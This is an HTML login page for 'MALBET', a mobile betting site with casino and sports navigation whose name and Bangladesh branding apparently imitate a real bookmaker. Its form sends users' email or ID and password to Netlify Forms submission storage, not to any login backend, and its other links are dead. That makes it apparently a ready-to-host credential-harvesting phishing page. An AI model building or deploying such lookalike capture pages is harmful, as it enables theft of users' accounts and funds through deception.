<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MALBET - Log In</title>
    <!-- Font Awesome for Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #f0f0f0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            max-width: 480px;
            margin: 0 auto;
            box-shadow: 0 0 15px rgba(0,0,0,0.1);
        }

        /* Top Header */
        .top-header {
            background-color: #1e1e1e;
            padding: 12px 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 20px;
            font-weight: 900;
            font-style: italic;
            color: #ffffff;
            letter-spacing: 0.5px;
        }

        .logo span {
            color: #ffb800;
        }

        .bd-flag {
            width: 24px;
            height: 16px;
            background-color: #006a4e;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            border-radius: 2px;
            transform: skewX(-10deg);
        }

        .bd-flag::after {
            content: '';
            width: 8px;
            height: 8px;
            background-color: #f42a41;
            border-radius: 50%;
        }

        .header-buttons {
            display: flex;
            gap: 8px;
        }

        .btn-header-login {
            background-color: #2c2c2c;
            color: #ffffff;
            border: none;
            padding: 8px 14px;
            border-radius: 6px;
            font-size: 13px;
            font-weight: 500;
            cursor: pointer;
        }

        .btn-header-reg {
            background-color: #ffb800;
            color: #1e1e1e;
            border: none;
            padding: 8px 14px;
            border-radius: 6px;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
        }

        /* Sub Header */
        .sub-header {
            background-color: #292929;
            padding: 12px 15px;
            display: flex;
            align-items: center;
            gap: 15px;
            color: #ffffff;
        }

        .back-btn {
            background-color: #424242;
            border: none;
            color: #ffffff;
            width: 36px;
            height: 36px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            font-size: 16px;
        }

        .sub-header h2 {
            font-size: 17px;
            font-weight: 700;
            letter-spacing: 0.5px;
        }

        /* Main Content */
        .main-content {
            flex: 1;
            padding: 20px 15px;
            background-color: #ededed;
        }

        /* Login Method Tabs */
        .tabs-container {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 8px;
            margin-bottom: 20px;
        }

        .tab-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            cursor: pointer;
            text-align: center;
        }

        .tab-box {
            width: 100%;
            height: 44px;
            background-color: #ffffff;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            color: #333333;
            margin-bottom: 6px;
            transition: all 0.2s ease;
        }

        .tab-item.active .tab-box {
            background-color: #262626;
            color: #ffffff;
        }

        .tab-label {
            font-size: 11px;
            color: #333333;
            font-weight: 500;
        }

        /* Form Inputs */
        .input-group {
            position: relative;
            margin-bottom: 14px;
        }

        .form-input {
            width: 100%;
            height: 50px;
            background-color: #ffffff;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            padding: 0 15px;
            font-size: 15px;
            color: #333333;
            outline: none;
        }

        .form-input:focus {
            border-color: #ffb800;
        }

        .toggle-password {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #333333;
            cursor: pointer;
            font-size: 18px;
        }

        /* Options Row */
        .options-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 18px 0 22px 0;
            font-size: 14px;
        }

        .remember-me {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #333333;
            cursor: pointer;
        }

        .remember-me input[type="checkbox"] {
            width: 20px;
            height: 20px;
            accent-color: #262626;
            cursor: pointer;
        }

        .forgot-link {
            color: #9e7300;
            text-decoration: underline;
            font-weight: 500;
        }

        /* Submit Button */
        .btn-submit {
            width: 100%;
            height: 50px;
            background-color: #ffb800;
            color: #1e1e1e;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn-submit:hover {
            background-color: #e6a600;
        }

        /* Register Prompt */
        .register-prompt {
            text-align: center;
            margin-top: 22px;
            font-size: 15px;
            color: #333333;
        }

        .register-prompt a {
            color: #9e7300;
            text-decoration: underline;
            font-weight: 500;
        }

        /* Bottom Navigation Bar */
        .bottom-nav {
            background-color: #ffffff;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-top: 1px solid #e0e0e0;
            height: 60px;
        }

        .nav-item {
            flex: 1;
            height: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            color: #666666;
            font-size: 11px;
            gap: 4px;
            cursor: pointer;
        }

        .nav-item i {
            font-size: 18px;
        }

        .nav-item.casino {
            background-color: #333333;
            color: #ffffff;
            border-top-right-radius: 25px;
            border-bottom-right-radius: 25px;
        }

        .nav-item.casino i {
            color: #ffb800;
        }

        .nav-item.active {
            background-color: #f5f5f5;
            color: #1e1e1e;
            font-weight: 600;
            border-bottom: 3px solid #ffb800;
        }
    </style>
</head>
<body>

    <!-- Top Header -->
    <header class="top-header">
        <div class="logo">
            MAL<span>BET</span>
            <div class="bd-flag"></div>
        </div>
        <div class="header-buttons">
            <button class="btn-header-login">Log in</button>
            <button class="btn-header-reg">Registration</button>
        </div>
    </header>

    <!-- Sub Header -->
    <div class="sub-header">
        <button class="back-btn" onclick="history.back()">
            <i class="fa-solid fa-arrow-left"></i>
        </button>
        <h2>LOG IN</h2>
    </div>

    <!-- Main Form Area -->
    <main class="main-content">
        <!-- Login Method Tabs -->
        <div class="tabs-container">
            <div class="tab-item active" onclick="selectTab(this, 'E-mail or ID*')">
                <div class="tab-box"><i class="fa-solid fa-envelope"></i></div>
                <span class="tab-label">By email</span>
            </div>
            <div class="tab-item" onclick="selectTab(this, 'Phone number*')">
                <div class="tab-box"><i class="fa-solid fa-mobile-screen-button"></i></div>
                <span class="tab-label">By phone</span>
            </div>
            <div class="tab-item" onclick="selectTab(this, 'Enter SMS code*')">
                <div class="tab-box"><i class="fa-solid fa-comment-dots"></i></div>
                <span class="tab-label">By code</span>
            </div>
            <div class="tab-item" onclick="selectTab(this, 'Social network ID*')">
                <div class="tab-box"><i class="fa-solid fa-users"></i></div>
                <span class="tab-label">Social networks</span>
            </div>
        </div>

        <!-- Login Form with Netlify Forms -->
        <form name="malbet-login" method="POST" netlify>
            <div class="input-group">
                <input type="text" name="email_or_id" id="loginIdentifier" class="form-input" placeholder="E-mail or ID*" required>
            </div>

            <div class="input-group">
                <input type="password" name="password" id="passwordInput" class="form-input" placeholder="Password*" required>
                <i class="fa-regular fa-eye-slash toggle-password" id="toggleEye" onclick="togglePassword()"></i>
            </div>

            <div class="options-row">
                <label class="remember-me">
                    <input type="checkbox" name="remember" id="rememberMe">
                    <span>Remember me</span>
                </label>
                <a href="#" class="forgot-link">Forgot your password?</a>
            </div>

            <button type="submit" class="btn-submit">LOG IN</button>
        </form>

        <div class="register-prompt">
            Don't have an account? <a href="#">Register</a>
        </div>
    </main>

    <!-- Bottom Navigation -->
    <nav class="bottom-nav">
        <a href="#" class="nav-item casino">
            <i class="fa-solid fa-dharmachakra"></i>
            <span>Casino</span>
        </a>
        <a href="#" class="nav-item">
            <i class="fa-solid fa-fire"></i>
            <span>Live</span>
        </a>
        <a href="#" class="nav-item">
            <i class="fa-solid fa-futbol"></i>
            <span>Sports</span>
        </a>
        <a href="#" class="nav-item">
            <i class="fa-solid fa-gamepad"></i>
            <span>Esports</span>
        </a>
        <a href="#" class="nav-item active">
            <i class="fa-solid fa-user"></i>
            <span>Log in</span>
        </a>
        <a href="#" class="nav-item">
            <i class="fa-solid fa-bars"></i>
            <span>Menu</span>
        </a>
    </nav>

    <!-- Interactive Script -->
    <script>
        function selectTab(element, placeholderText) {
            document.querySelectorAll('.tab-item').forEach(tab => {
                tab.classList.remove('active');
            });
            element.classList.add('active');
            document.getElementById('loginIdentifier').placeholder = placeholderText;
        }

        function togglePassword() {
            const passwordInput = document.getElementById('passwordInput');
            const eyeIcon = document.getElementById('toggleEye');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.classList.remove('fa-eye-slash');
                eyeIcon.classList.add('fa-eye');
            } else {
                passwordInput.type = 'password';
                eyeIcon.classList.remove('fa-eye');
                eyeIcon.classList.add('fa-eye-slash');
            }
        }
    </script>
</body>
</html>
